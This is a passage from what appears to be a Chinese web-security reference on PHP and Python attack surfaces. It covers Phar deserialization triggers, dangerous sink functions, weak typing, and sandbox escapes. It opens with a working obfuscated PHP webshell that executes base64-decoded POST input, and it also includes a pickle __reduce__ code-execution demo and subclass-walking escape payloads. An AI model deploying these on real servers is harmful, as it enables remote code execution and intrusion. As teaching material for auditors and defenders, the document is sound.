$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;
$____=&#39;_&#39;;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___(base64_decode($_[_]));
</pre></div>
</div>
</div>
<div class="section" id="id7">
<h5>检测对抗<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>基于混淆影响程序分析</li>
<li>基于动态变量影响程序执行</li>
<li>抛出异常打断数据流分析</li>
<li>基于反射打断数据流分析</li>
<li>基于引用传递打断数据流分析</li>
</ul>
</div>
</div>
<span id="document-language/php/phar"></span><div class="section" id="phar">
<h4>Phar<a class="headerlink" href="#phar" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>Phar（PHP Archive）文件是一种打包格式，将PHP代码文件和其他资源放入一个文件中来实现应用程序和库的分发。</p>
<p>在来自Secarma的安全研究员Sam Thomas在18年的Black Hat上提出后利用方式后，开始受到广泛的关注。</p>
<p>Phar可利用是因为Phar以序列化的形式存储用户自定义的meta-data，而以流的形式打开的时候，会自动反序列化，从而触发对应的攻击载荷。</p>
</div>
<div class="section" id="id2">
<h5>Phar文件结构<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>Phar由四个部分组成，分别是 <code class="docutils literal notranslate"><span class="pre">stub</span></code> / <code class="docutils literal notranslate"><span class="pre">manifest</span></code> / 文件内容 / 签名。 stub 需要 <code class="docutils literal notranslate"><span class="pre">__HALT_COMPILER();</span></code> 这个调用在PHP代码中。</p>
<p>manifest 包含压缩文件的权限、属性、序列化形式存储的meta-data等信息，这是攻击的核心部分，主要就是解析Phar时对meta-data的反序列化。</p>
</div>
<div class="section" id="id3">
<h5>原理<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>phar的实现在 <code class="docutils literal notranslate"><span class="pre">php-src/ext/phar/phar.c</span></code> 中，主要是 <code class="docutils literal notranslate"><span class="pre">phar_parse_metadata</span></code> 函数在解析phar文件时调用了 <code class="docutils literal notranslate"><span class="pre">php_var_unserialize</span></code> ，因而造成问题。</p>
<p>而php在文件流处理过程中会调用 <code class="docutils literal notranslate"><span class="pre">_php_stream_stat_path</span></code> (/main/streams/streams.c) ，而后间接调用 <code class="docutils literal notranslate"><span class="pre">phar_wrapper_stat</span></code> ，所以大量的文件操作函数都可以触发phar的反序列问题。</p>
<p>目前已知部分的触发函数有:</p>
<p>fileatime / filectime / filemtime /stat / fileinode / fileowner / filegroup / fileperms / file / file_get_contents / readfile / fopen / file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable / parse_ini_file / unlink / copy / exif_thumbnail / exif_imagetype / imageloadfont / imagecreatefrom*** / hash_hmac_file / hash_file / hash_update_file / md5_file / sha1_file / get_meta_tags / get_headers / getimagesize / getimagesizefromstring</p>
</div>
</div>
<span id="document-language/php/sink"></span><div class="section" id="sink">
<h4>Sink<a class="headerlink" href="#sink" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>任意代码执行<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>eval</li>
<li>assert</li>
<li>call_user_func</li>
</ul>
</div>
<div class="section" id="id2">
<h5>执行系统命令<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>pcntl_exec</li>
<li>exec</li>
<li>passthru</li>
<li>popen</li>
<li>shell_exec</li>
<li>system</li>
<li>proc_open</li>
</ul>
</div>
<div class="section" id="magic">
<h5>Magic函数<a class="headerlink" href="#magic" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">__construct()</span></code> 构建对象的时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__destruct()</span></code> 销毁对象或脚本结束时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__call()</span></code> 调用不可访问或不存在的方法时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__callStatic()</span></code> 调用不可访问或不存在的静态方法时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__get()</span></code> 读取不可访问或不存在属性时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__set()</span></code> 给不可访问或不存在属性赋值时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__isset()</span></code> 对不可访问或不存在的属性调用 <code class="docutils literal notranslate"><span class="pre">isset</span></code> 或 <code class="docutils literal notranslate"><span class="pre">empty()</span></code> 时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__unset()</span></code> 对不可访问或不存在的属性进行 <code class="docutils literal notranslate"><span class="pre">unset</span></code> 时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__sleep()</span></code> 对象序列化时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__wakeup()</span></code> 对象反序列化时被调用，其中序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</li>
<li><code class="docutils literal notranslate"><span class="pre">__toString()</span></code> 当一个类被转换成字符串时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__invoke()</span></code> 对象被以函数方式调用时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__set_state()</span></code> 调用 <code class="docutils literal notranslate"><span class="pre">var_export()</span></code> 导出类时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__clone()</span></code> 进行对象clone时被调用</li>
<li><code class="docutils literal notranslate"><span class="pre">__debugInfo()</span></code> 调用 <code class="docutils literal notranslate"><span class="pre">var_dump()</span></code> 打印对象时被调用</li>
</ul>
</div>
<div class="section" id="id3">
<h5>文件相关敏感函数<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">move_uploaded_file</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">file_put_contents</span></code> / <code class="docutils literal notranslate"><span class="pre">file_get_contents</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">unlink</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">fopen</span></code> / <code class="docutils literal notranslate"><span class="pre">fgets</span></code></li>
</ul>
</div>
<div class="section" id="ssrf">
<h5>SSRF<a class="headerlink" href="#ssrf" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">file_get_contents()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">fsockopen()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">curl_exec()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">fopen()</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">readfile()</span></code></li>
</ul>
</div>
<div class="section" id="phar">
<h5>phar 触发点<a class="headerlink" href="#phar" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>fileatime / filectime / filemtime</li>
<li>stat / fileinode / fileowner / filegroup / fileperms</li>
<li>file / file_get_contents / readfile / fopen`</li>
<li>file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable</li>
<li>parse_ini_file</li>
<li>unlink</li>
<li>copy</li>
<li><dl class="first docutils">
<dt>exif</dt>
<dd><ul class="first last">
<li>exif_thumbnail</li>
<li>exif_imagetype</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>gd</dt>
<dd><ul class="first last">
<li>imageloadfont</li>
<li>imagecreatefrom***</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>hash</dt>
<dd><ul class="first last">
<li>hash_hmac_file</li>
<li>hash_file</li>
<li>hash_update_file</li>
<li>md5_file</li>
<li>sha1_file</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>file / url</dt>
<dd><ul class="first last">
<li>get_meta_tags</li>
<li>get_headers</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>standard</dt>
<dd><ul class="first last">
<li>getimagesize</li>
<li>getimagesizefromstring</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id4">
<h5>原生类利用<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><dl class="first docutils">
<dt>XSS</dt>
<dd><ul class="first last">
<li>Error</li>
<li>Exception</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>SSRF</dt>
<dd><ul class="first last">
<li>SoapClient</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>open_basedir 绕过</dt>
<dd><ul class="first last">
<li>DirectoryIterator 结合 <code class="docutils literal notranslate"><span class="pre">glob://</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>XXE</dt>
<dd><ul class="first last">
<li>SimpleXMLElement</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<span id="document-language/php/misc"></span><div class="section" id="id1">
<h4>其它<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>低精度<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>php中并不是用高精度来存储浮点数，而是用使用 IEEE 754 双精度格式，造成在涉及到浮点数比较的时候可能会出现预期之外的错误。
比如 <code class="docutils literal notranslate"><span class="pre">php</span> <span class="pre">-r</span> <span class="pre">&quot;var_dump(0.2+0.7==0.9);&quot;</span></code> 这行代码的输出是 <code class="docutils literal notranslate"><span class="pre">bool(false)</span></code> 而不是 <code class="docutils literal notranslate"><span class="pre">bool(true)</span></code>。这在一些情况下可能出现问题。</p>
</div>
<div class="section" id="id3">
<h5>弱类型<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>如果使用 <code class="docutils literal notranslate"><span class="pre">==</span></code> 来判断相等，则会因为类型推断出现一些预料之外的行为，比如magic hash，指当两个md5值都是 <code class="docutils literal notranslate"><span class="pre">0e[0-9]{30}</span></code> 的时候，就会认为两个hash值相等。
另外在判断字符串和数字的时候，PHP会自动做类型转换，那么 <code class="docutils literal notranslate"><span class="pre">1==&quot;1a.php&quot;</span></code> 的结果会是true</p>
<p>另外在判断一些hash时，如果传入的是数组，返回值会为 <code class="docutils literal notranslate"><span class="pre">NULL</span></code>, 因此在判断来自网络请求的数据的哈希值时需要先判断数据类型。</p>
<p>同样的， <code class="docutils literal notranslate"><span class="pre">strcmp()</span></code> <code class="docutils literal notranslate"><span class="pre">ereg()</span></code> <code class="docutils literal notranslate"><span class="pre">strpos()</span></code> 这些函数在处理数组的时候也会异常，返回NULL。</p>
</div>
<div class="section" id="id4">
<h5>命令执行<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>preg_replace 第一个参数是//e的时候，第二个参数会被当作命令执行</p>
</div>
<div class="section" id="id5">
<h5>截断<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>PHP字符存在截断行为，可以使用 <code class="docutils literal notranslate"><span class="pre">ereg</span></code> / <code class="docutils literal notranslate"><span class="pre">%00</span></code> / <code class="docutils literal notranslate"><span class="pre">iconv</span></code> 等实现php字符截断的操作，从而触发漏洞。</p>
</div>
<div class="section" id="id6">
<h5>变量覆盖<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>当使用 <code class="docutils literal notranslate"><span class="pre">extract</span></code> / <code class="docutils literal notranslate"><span class="pre">parse_str</span></code> 等函数时，或者使用php的 <code class="docutils literal notranslate"><span class="pre">$$</span></code> 特性时，如果没有正确的调用，则可能使得用户可以任意修改变量。</p>
</div>
<div class="section" id="php">
<h5>php特性<a class="headerlink" href="#php" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>php自身在解析请求的时候，如果参数名字中包含&quot; &quot;、&quot;.&quot;、&quot;[&quot;这几个字符，会将他们转换成下划线</li>
<li>由于历史原因， <code class="docutils literal notranslate"><span class="pre">urlencode</span></code> 和RFC3896存在一定的不同，PHP另外提供了 <code class="docutils literal notranslate"><span class="pre">rawurlencode</span></code> 对RFC3896完成标准的实现</li>
</ul>
</div>
<div class="section" id="tmp">
<h5>/tmp临时文件竞争<a class="headerlink" href="#tmp" title="永久链接至标题">¶</a></h5>
<p>phpinfo可访问时，可以看到上传的临时文件的路径，从而实现LFI。</p>
</div>
</div>
<span id="document-language/php/version"></span><div class="section" id="id1">
<h4>版本安全改动<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>8.0<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>字符串数字弱类型比较</li>
<li>内部参数内省错误时抛出异常而不是警告</li>
<li><code class="docutils literal notranslate"><span class="pre">assert</span></code> 不再支持执行代码</li>
<li>移除 <code class="docutils literal notranslate"><span class="pre">create_function</span></code></li>
<li>移除 <code class="docutils literal notranslate"><span class="pre">mb_ereg_replace()</span></code> 中的e模式</li>
<li>Phar中的元信息不再自动进行反序列化</li>
<li><code class="docutils literal notranslate"><span class="pre">parse_str</span></code> 必须传入第二个参数</li>
<li>移除 <code class="docutils literal notranslate"><span class="pre">php://filter</span></code> 中的 <code class="docutils literal notranslate"><span class="pre">string.strip_tags</span></code></li>
</ul>
</div>
<div class="section" id="id3">
<h5>7.2<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>不带引号的字符串 会产生 E_WARNING</li>
<li>create_function 被废弃</li>
<li>assert 不能传入字符串表达式</li>
<li>不带第二个参数的情况下使用 parse_str() 会产生 E_DEPRECATED 警告</li>
<li>__autoload() 被废弃</li>
</ul>
</div>
<div class="section" id="id4">
<h5>7.1<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>调用用户定义的函数提供的参数不足会抛出错误异常而不是警告</li>
<li>在不完整的对象上不再调用析构方法</li>
<li>call_user_func() 不再支持对传址的函数的调用</li>
<li>mb_ereg_replace() 和 mb_eregi_replace() 的e模式修饰符被废弃</li>
<li>ext/mcrypt 被废弃</li>
</ul>
</div>
<div class="section" id="id5">
<h5>7.0<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>preg_replace &quot;e&quot; 修饰符 产生 E_WARNING 错误 且失效</li>
<li>移除 所有 ext/mysql 函数</li>
<li>移除 所有 ext/mssql 函数</li>
<li>移除 call_user_method() 和 call_user_method_array()</li>
<li>foreach 不再改变内部数组指针</li>
<li>在之前，一个八进制字符如果含有无效数字，该无效数字将被静默删节 ( 0128 将被解析为 012)，现在这样的八进制字符将产生解析错误</li>
<li>十六进制字符串不再被认为是数字</li>
<li>dl() 在 PHP-FPM 不再可用，在 CLI 和 embed SAPIs 中仍可用</li>
<li>移除 ASP 和 script PHP 标签，即 <code class="docutils literal notranslate"><span class="pre">&lt;%</span> <span class="pre">%&gt;</span></code> / <code class="docutils literal notranslate"><span class="pre">&lt;%=</span> <span class="pre">%&gt;</span></code> / <code class="docutils literal notranslate"><span class="pre">&lt;script</span> <span class="pre">language=&quot;php&quot;&gt;</span> <span class="pre">&lt;/script&gt;</span></code></li>
<li>在数值溢出的时候，内部函数将会失败</li>
<li>$HTTP_RAW_POST_DATA 被移除</li>
</ul>
</div>
<div class="section" id="id6">
<h5>5.6<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>$HTTP_RAW_POST_DATA 被废弃</li>
<li>必须先设置 CURLOPT_SAFE_UPLOAD 为 FALSE 才能够使用 &#64;file 语法来上传文件</li>
</ul>
</div>
<div class="section" id="id7">
<h5>5.5<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>preg_replace &quot;e&quot; 修饰符 产生 E_DEPRECATED 错误</li>
<li>废弃 <code class="docutils literal notranslate"><span class="pre">mysql_*</span></code> 系列函数</li>
</ul>
</div>
<div class="section" id="id8">
<h5>5.4<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>不再支持 安全模式</li>
<li>移除 魔术引号</li>
<li>数组转换成字符串将产生一条 E_NOTICE 级别的错误</li>
</ul>
</div>
</div>
<span id="document-language/php/trick"></span><div class="section" id="tricks">
<h4>Tricks<a class="headerlink" href="#tricks" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>is_numeric 前后有空格时，不会判断为true</li>
<li>松散比较时，两个0e开头的不同哈希会判断为相等</li>
<li>松散比较时，非数字的字符串序列和数字比较会自动转换</li>
<li>strcmp/ereg 等函数在传入参数类型为数组时会有非预期行为</li>
</ul>
</div>
<span id="document-language/php/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="bypass">
<h5>Bypass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">php open basedir bypass</a></li>
<li><a class="reference external" href="https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/">open basedir bypass</a></li>
<li><a class="reference external" href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">Bypass Disable functions Shell</a></li>
</ul>
</div>
<div class="section" id="tricks">
<h5>Tricks<a class="headerlink" href="#tricks" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.ptsecurity.com/upload/corporate/ru-ru/webinars/ics/%D0%90.%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B8%D0%BD_%D0%9E_%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF_%D0%B8%D1%81%D0%BF_%D0%A0%D0%9D%D0%A0_wrappers.pdf">php wrappers</a></li>
<li><a class="reference external" href="http://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></li>
<li><a class="reference external" href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">php解密的数种方法</a></li>
<li><a class="reference external" href="https://gynvael.coldwind.pl/?id=671">Surprising CTF task solution using php://filter</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/ol70aVdvybzMJmtfxaAAZQ">主机安全 洋葱Webshell检测实践与思考</a></li>
</ul>
</div>
<div class="section" id="id3">
<h5>WebShell<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet">PHP htaccess inject</a></li>
<li><a class="reference external" href="https://blog.manchestergreyhats.co.uk/2018/11/07/php-malware-examination/">php木马加密</a></li>
<li><a class="reference external" href="https://www.freebuf.com/articles/web/155891.html">PHP WebShell变形技术总结</a></li>
<li><a class="reference external" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/FgzIm-IK02rjEf3JvxOxrw">PHP Webshell那些事-攻击篇</a></li>
</ul>
</div>
<div class="section" id="phar">
<h5>Phar<a class="headerlink" href="#phar" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf">US Black Hat 2018 Phar</a></li>
<li><a class="reference external" href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></li>
<li><a class="reference external" href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li>
</ul>
</div>
<div class="section" id="id7">
<h5>运行<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://www.phpinternalsbook.com/php7/extensions_design/php_lifecycle.html">Learning the PHP lifecycle</a></li>
<li><a class="reference external" href="https://github.com/pangudashu/php7-internal">PHP7内核剖析</a></li>
</ul>
</div>
<div class="section" id="blog">
<h5>Blog<a class="headerlink" href="#blog" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/">How we broke PHP</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-language/python/index"></span><div class="section" id="python">
<h3>Python<a class="headerlink" href="#python" title="永久链接至标题">¶</a></h3>
<div class="toctree-wrapper compound">
<span id="document-language/python/fmtstr"></span><div class="section" id="id1">
<h4>格式化字符串<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>在Python中，有两种格式化字符串的方式，在Python2的较低版本中，格式化字符串的方式为 <code class="docutils literal notranslate"><span class="pre">&quot;this</span> <span class="pre">is</span> <span class="pre">a</span> <span class="pre">%s&quot;</span> <span class="pre">%</span> <span class="pre">&quot;test&quot;</span></code> ，之后增加了format的方式， 语法为 <code class="docutils literal notranslate"><span class="pre">&quot;this</span> <span class="pre">is</span> <span class="pre">a</span> <span class="pre">{}&quot;.format('test')</span></code> 或者 <code class="docutils literal notranslate"><span class="pre">&quot;this</span> <span class="pre">is</span> <span class="pre">a</span> <span class="pre">{test}&quot;.format(test='test')</span></code></p>
<p>当格式化字符串由用户输入时，则可能会造成一些问题，下面是一个最简单的例子</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;class of </span><span class="si">{0}</span><span class="s1"> is </span><span class="si">{0.__class__}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>
<span class="go">&quot;class of 42 is &lt;class &#39;int&#39;&gt;&quot;</span>
</pre></div>
</div>
<p>从上面这个简单的例子不难知道，当我们可以控制要format的字符串时，则可以使用 <code class="docutils literal notranslate"><span class="pre">__init__</span></code> / <code class="docutils literal notranslate"><span class="pre">__globals__</span></code> 等属性读取一些比较敏感的值，甚至任意执行代码。</p>
</div>
<span id="document-language/python/unserialize"></span><div class="section" id="id1">
<h4>反序列化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="pickle-demo">
<h5>pickle demo<a class="headerlink" href="#pickle-demo" title="永久链接至标题">¶</a></h5>
<p>Python Pickle在反序列化时会调用 <code class="docutils literal notranslate"><span class="pre">__reduce__</span></code> ，可用自定义的 <code class="docutils literal notranslate"><span class="pre">__reduce__</span></code> 函数来实现攻击。</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">pickletools</span>
<span class="kn">import</span> <span class="nn">subprocess</span>

<span class="k">class</span> <span class="nc">A</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">,</span> <span class="p">((</span><span class="s1">&#39;cmd.exe&#39;</span><span class="p">,),))</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">A</span><span class="p">())</span>
<span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="section" id="id2">
<h5>其他序列化库<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>PyYAML</li>
<li>marshal</li>
<li>shelve</li>
</ul>
</div>
</div>
<span id="document-language/python/sandbox"></span><div class="section" id="id1">
<h4>沙箱<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>常用函数<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>eval / exec / compile</li>
<li>dir / type</li>
<li>globals / locals / vars</li>
<li>getattr / setattr</li>
</ul>
</div>
<div class="section" id="id3">
<h5>导入包方式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">import</span> <span class="pre">os</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">from</span> <span class="pre">os</span> <span class="pre">import</span> <span class="pre">*</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">__import__(&quot;os&quot;)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">importlib</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">imp</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">reload(os)</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">execfile</span></code> 仅Python2支持</li>
</ul>
</div>
<div class="section" id="id4">
<h5>绕过<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">dir(__builtins__)</span></code> 查看内置模块</li>
<li>最简单的思路是在已有的模块中import，如果那个模块中已经 import 可以利用的模块就可以使用了</li>
<li>在父类中寻找可用的模块，最常见payload是 <code class="docutils literal notranslate"><span class="pre">().__class__.__bases__[0].__subclasses__()</span></code> 或者用魔术方法获取全局作用域 <code class="docutils literal notranslate"><span class="pre">__init__.__func__.__globals__</span></code></li>
<li>有些网站没有过滤 pickle 模块，可以使用 pickle 实现任意代码执行，生成 payload 可以使用 <code class="docutils literal notranslate"><span class="pre">https://gist.github.com/freddyb/3360650</span></code></li>
<li>有的沙箱把相关的模块代码都被删除了，则可以使用libc中的函数，Python 中调用一般可以使用 ctypes 或者 cffi。</li>
<li><code class="docutils literal notranslate"><span class="pre">&quot;A&quot;&quot;B&quot;</span> <span class="pre">==</span> <span class="pre">&quot;AB&quot;</span></code></li>
</ul>
</div>
<div class="section" id="id5">
<h5>防御<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>Python官方给出了一些防御的建议</p>
<ul class="simple">
<li>使用Jython并尝试使用Java平台来锁定程序的权限</li>
<li>使用fakeroot来避免</li>
<li>使用一些rootjail的技术</li>
</ul>
</div>
</div>
<span id="document-language/python/framework"></span><div class="section" id="id1">
<h4>框架<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="django">
<h5>Django<a class="headerlink" href="#django" title="永久链接至标题">¶</a></h5>
<div class="section" id="id2">
<h6>历史漏洞<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><a class="reference external" href="https://paper.seebug.org/58/">CVE-2016-7401 CSRF Bypass</a></li>
<li><a class="reference external" href="https://www.djangoproject.com/weblog/2017/apr/04/security-releases/">CVE-2017-7233/7234 Open redirect vulnerability</a></li>
<li><a class="reference external" href="https://www.leavesongs.com/PENETRATION/django-debug-page-xss.html">CVE-2017-12794 debug page XSS</a></li>
</ul>
</div>
<div class="section" id="id3">
<h6>配置相关<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>Nginx 在为 Django 做反向代理时，静态文件目录配置错误会导致源码泄露。访问 /static.. 会 301 重定向到 /static../</li>
</ul>
</div>
</div>
<div class="section" id="flask">
<h5>Flask<a class="headerlink" href="#flask" title="永久链接至标题">¶</a></h5>
<p>Flask默认使用客户端session，使得session可以被伪造</p>
</div>
</div>
<span id="document-language/python/obfuscate"></span><div class="section" id="id1">
<h4>代码混淆<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>常见混淆方式<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>基于AST变换</li>
<li>编译为pyc文件</li>
<li>Pyinstaller</li>
<li>PyArmor</li>
<li>通过 AES 加密为 pye 文件</li>
</ul>
</div>
</div>
<span id="document-language/python/sink"></span><div class="section" id="sink">
<h4>Sink<a class="headerlink" href="#sink" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>命令执行<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>bdb.os</li>
<li>cgi.os.system</li>
<li>cgi.sys</li>
<li>commands</li>
<li>ctypes.CDLL</li>
<li>eval</li>
<li>exec</li>
<li>execfile</li>
<li>input // python2 only</li>
<li>os.exec</li>
<li>os.fork</li>
<li>os.popen</li>
<li>os.spawn</li>
<li>os.system</li>
<li>platform.os</li>
<li>platform.popen</li>
<li>platform.sys</li>
<li>popen2</li>
<li>pty.os</li>
